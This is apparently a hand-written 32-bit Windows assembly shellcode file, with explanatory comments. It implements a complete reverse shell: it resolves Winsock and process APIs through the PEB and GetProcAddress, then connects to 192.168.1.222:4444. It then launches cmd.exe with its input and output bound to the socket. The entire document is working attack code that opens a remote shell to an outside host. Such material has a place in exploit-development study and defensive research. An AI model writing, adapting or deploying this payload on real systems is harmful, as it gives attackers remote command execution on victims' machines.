global_start


section .text
_start: 

xor ecx, ecx
mul ecx
mov eax, [fs:ecx + 0x30] 
mov eax, [eax + 0xc]     
mov esi, [eax + 0x14]    
lodsd                    
xchg eax, esi            
lodsd                    
mov ebx, [eax + 0x10]    
mov edi, [ebx + 0x3c]    
add edi, ebx             
mov edi, [edi + 0x78]    
add edi, ebx             
mov esi, [edi + 0x20]    
add esi, ebx             
xor ecx, ecx             

Get_Function:
 
inc ecx                              
lodsd                                
add eax, ebx                         
cmp dword [eax], 0x50746547          ; GetP
jnz Get_Function
cmp word [eax + 0xa], 0x73736572     ; ress
jnz Get_Function
mov esi, [edi + 0x24]                
add esi, ebx                           
mov cx, [esi + ecx * 2]              
dec ecx
mov esi, [edi + 0x1c]               
add esi, ebx                        
mov edi, [esi + ecx * 4]             
add edi, ebx                        

; use GetProcAddress to find LoadLibraryA
xor ecx, ecx
push ecx
push 0x41797261
push 0x7262694c
push 0x64616f4c
push esp
push ebx
call edi

; EAX = LoadLibraryA address
; ECX = kernel32 base address
; EDX = kernel32 base address
; EBX = kernel32 base address
; ESP = stack pointer to 'LoadLibraryA' 
; ESI = ???
; EDI = GetProcAddress address

; use LoadLibraryA to load the ws2_32.dll
push 0x61616c6c
sub word [esp + 0x2], 0x6161
push 0x642e3233
push 0x5f327377
push esp
call eax

; EAX = ws2_32.dll address
; ECX = ???
; EDX = some sort of offset
; EBX = kernel32 base address
; ESP = pointer to string "ws2_32.dll'
; ESI = some address
; EDI = GetProcAddress address

; use GetProcAddress to get location of WSAStartup function
push 0x61617075
sub word [esp + 0x2], 0x6161
push 0x74726174
push 0x53415357
push esp
push eax
call edi

push eax
lea esi, [esp]                  ; esi will store WSAStartup location, and we'll calculate offsets from here

; use GetProcAddress to get location of WSASocketA
push 0x61614174
sub word [esp + 0x2], 0x6161
push 0x656b636f
push 0x53415357
push esp
push ecx
call edi

mov [esi + 0x4], eax                  ; esi at offset 0x4 will now hold the address of WSASocketA

; use GetProcAddress to get the location of connect
push 0x61746365
sub dword [esp + 0x3], 0x61
push 0x6e6e6f63
push esp
push ecx
call edi

mov [esi + 0x8], eax                  ; esi at offset 0x8 will now hold the address of connect

; use GetProcAddress to get the location of CreateProcessA
push 0x61614173 
sub word [esp + 0x2], 0x6161
push 0x7365636f
push 0x72506574
push 0x61657243
push esp
push ebx
call edi

mov [esi + 0xc], eax                   ; esi at offset 0xc will now hold the address of CreateProcessA

; use GetProcAddress to get the location of ExitProcess
push 0x61737365
sub dword [esp + 0x3], 0x61
push 0x636f7250
push 0x74697845
push esp
push ebx
call edi 

mov [esi + 0x10], eax                  ; esi at offset 0x10 will now hold the address of ExitProcess

; call WSAStartup
xor edx, edx
mov dx, 0x0190
sub esp, edx
push esp
push edx
call dword [esi]

; call WSASocketA
push eax                              ; still null from our return code of WSAStartup :)
push eax
push eax
xor edx, edx
mov dl, 0x6
push edx
inc eax
push eax
inc eax
push eax
call dword [esi + 0x4]



; call connect
push 0xde01a8c0                      ; sin_addr set to 192.168.1.222
push word 0x5c11                     ; port = 4444
xor ebx, ebx
add bl, 0x2
push word bx
mov edx, esp
push byte 16
push edx
push eax
xchg eax, edi
call dword [esi + 0x8]

; CreateProcessA shenanigans
push 0x61646d63                      ; "cmda"
sub dword [esp + 0x3], 0x61          ; "cmd"
mov edx, esp                         ; edx now pointer to our 'cmd' string

; set up the STARTUPINFO struct
push edi
push edi
push edi                             ; we just put our SOCKET_FD into the arg params for HANDLE hStdInput; HANDLE hStdOutput; and HANDLE hStdError;
xor ebx, ebx
xor ecx, ecx
add cl, 0x12                         
; we're going to throw 0x00000000 onto the stack 18 times, this will fill up both the STARTUPINFO and PROCESS_INFORMATION structs
; then we will retroactively fill them up with the arguments we need by using effective addressing relative to ESP like mov word [esp +]

looper: 
push ebx
loop looper

mov word [esp + 0x3c], 0x0101        ; set dwFlags arg in STARTUPINFO
mov byte [esp + 0x10], 0x44          ; cb member of the struct set to 68 decimal, size of struct
lea eax, [esp + 0x10]                ; eax now a pointer to STARTUPINFO

; Actually Calling CreateProcessA now
push esp                             ; pointer to PROCESS_INFORMATION
push eax                             ; pointer to STARTUPINFO
push ebx                             ; all NULLs
push ebx
push ebx
inc ebx                              ; bInheritHandles == True
push ebx
dec ebx
push ebx
push ebx
push edx                             ; pointer to 'cmd' 
push ebx

call dword [esi + 0xc]

; call ExitProcess
push ebx                             ; still null
call dword [esi + 0x10]
